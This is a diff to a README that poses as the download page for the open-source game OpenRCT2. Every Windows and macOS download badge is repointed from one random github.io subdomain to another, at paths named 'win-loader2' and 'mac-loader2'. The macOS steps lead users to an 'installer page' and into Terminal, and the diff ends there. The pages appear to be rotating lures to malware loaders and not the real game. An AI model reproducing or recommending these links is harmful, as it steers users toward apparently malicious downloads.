@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_OpenRCT2-F9A825?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_OpenRCT2-F9A825?style=for-the-badge&logo=github)](https://rvpextofpmgo.github.io/win-loader2/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://shellwarlockfigure.github.io/windows-dl/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://rvpextofpmgo.github.io/win-loader2/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://rvpextofpmgo.github.io/mac-loader2/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_OpenRCT2-F9A825?style=for-the-badge&logo=github)](https://shellwarlockfigure.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_OpenRCT2-F9A825?style=for-the-badge&logo=github)](https://rvpextofpmgo.github.io/win-loader2/)
 
 </div>
 
@@ -104,7 +104,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://shellwarlockfigure.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://rvpextofpmgo.github.io/mac-loader2/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
